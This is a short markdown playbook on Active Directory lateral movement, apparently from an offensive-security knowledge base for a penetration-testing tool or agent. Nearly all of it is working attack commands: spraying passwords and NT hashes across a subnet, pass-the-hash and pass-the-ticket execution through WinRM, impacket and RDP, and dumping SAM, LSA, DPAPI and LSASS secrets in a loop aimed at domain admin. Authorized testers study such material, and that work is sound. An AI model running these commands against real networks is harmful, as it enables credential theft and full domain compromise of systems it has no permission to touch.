# Moraa — Lateral Movement

> You have creds or a hash; move host-to-host toward the goal. Validate each hop, loot each box.
> Deep reference: `knowledge/offensive/offensive-active-directory.md` (lateral section). Pivot must be up first.

---

## Spray creds/hash across the subnet (find where they work)

```bash
# Password
nxc smb 10.10.10.0/24 -u USER -p PASS
# NT hash (Pass-the-Hash)
nxc smb 10.10.10.0/24 -u USER -H NTHASH
# Local admin reuse (very common) — same local admin hash across hosts
nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth
# Add --sam --lsa --dpapi to auto-loot where you're admin; (Pwn3d!) = admin
```

## Execute (pick by what's open / stealth)

```bash
# WinRM (5985) — cleanest
evil-winrm -i TARGET -u USER -p PASS
evil-winrm -i TARGET -u USER -H NTHASH

# SMB exec
impacket-psexec   corp.local/USER@TARGET -hashes :NTHASH    # noisy, SYSTEM, service
impacket-wmiexec  corp.local/USER@TARGET -hashes :NTHASH    # quieter, WMI
impacket-atexec   corp.local/USER@TARGET -hashes :NTHASH "whoami"   # scheduled task
impacket-smbexec  corp.local/USER@TARGET -hashes :NTHASH

# RDP
xfreerdp /v:TARGET /u:USER /p:PASS +clipboard /dynamic-resolution
xfreerdp /v:TARGET /u:USER /pth:NTHASH         # restricted-admin PtH
```

## Kerberos movement (when NTLM blocked / for stealth)

```bash
# Overpass-the-hash: NT hash → TGT
impacket-getTGT corp.local/USER -hashes :NTHASH
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass corp.local/USER@TARGET.corp.local

# Pass-the-ticket (.kirbi/.ccache)
export KRB5CCNAME=admin.ccache
nxc smb TARGET --use-kcache
```

## Loot every host you land on

```bash
# auto where admin:
nxc smb TARGET -u USER -H NTHASH --sam --lsa --dpapi
# manual:
impacket-secretsdump corp.local/USER@TARGET -hashes :NTHASH
# LSASS dump → pypykatz (see active-directory.md)
```

New creds/hashes → re-spray (loop) and **re-run BloodHound** as the new identity. Each landed
host: check for the next subnet (double pivot via `pivoting.md`) and domain priv (kerberoast,
ACLs, ADCS via `active-directory.md`).

## Movement loop

```
have cred/hash → nxc spray subnet → where Pwn3d! → exec (winrm/wmi/psexec)
   → loot (sam/lsa/dpapi/lsass) → new creds → re-spray + re-bloodhound → toward DA
```

Document each hop (source → target, method, command, result, timestamp) into `findings/` /
`report/03-attack-narrative.md`.
